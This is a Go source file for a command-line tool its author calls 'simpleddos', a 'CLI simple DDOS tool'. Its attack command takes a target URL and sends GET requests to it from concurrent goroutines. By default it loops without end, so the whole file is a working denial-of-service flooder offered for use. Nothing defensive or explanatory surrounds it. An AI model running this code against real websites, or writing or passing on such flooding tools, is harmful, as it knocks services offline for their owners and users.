package main

import (
	"fmt"
	"log"
	"net/http"
	"net/url"
	"os"
	"sort"
	"time"
	"github.com/codegangsta/cli"
)

var (
	client http.Client
)

func request(url *url.URL) {
	req, err := http.NewRequest("GET", url.String(), nil)
	if err != nil {
		log.Fatalf("Creating request: %v", err)
	}

	client.Do(req)

	// resp, err := client.Do(req)
	// if err != nil {
	// 	log.Fatalf("%v", err)
	// }

	// fmt.Println(resp.Status)
}

func attack(c *cli.Context) {
	if c.NArg() == 0 {
		log.Fatal("Missing URL")
	}

	url, err := url.ParseRequestURI(c.Args().Get(0))
	if err != nil {
		log.Fatalf("%v", err)
	}

	length := c.Int("length")
	fmt.Println("Attacking the url:", url)

	if length > 0 {
		for i := 0; i < length; i++ {
			fmt.Printf("-")
			go request(url)
		}
	} else {
		for {
			fmt.Print("-")
			go request(url)
		}
	}
	fmt.Println("")
}

func main() {
	app := cli.NewApp()
	app.Name = "simpleddos"
	app.Usage = "CLI simple DDOS tool"
	app.Version = "0.0.1"
	app.Author = "Nobi Hoang"
	app.Email = "nobi.hoa@gmail.com"
	app.Copyright = fmt.Sprintf("Copyright © %d Nobi Hoang", time.Now().Year())
	
	app.Commands = []cli.Command{
		{
			Name: "attack",
			ShortName: "a",
			Usage: "simultanously send thousands of requests to an URL",
			UsageText: "simpleddos a http://example.com",
			Description: "This tool will send thousands of requests to an URL.",
			Flags: []cli.Flag{
				cli.IntFlag{
					Name: "length, n",
					Usage: "number of requests, default is unlimitted",
					EnvVar: "LENGTH",
				},
			},
			Action: attack,
		},
	}

	sort.Sort(cli.FlagsByName(app.Flags))
	sort.Sort(cli.CommandsByName(app.Commands))

	app.Run(os.Args)
}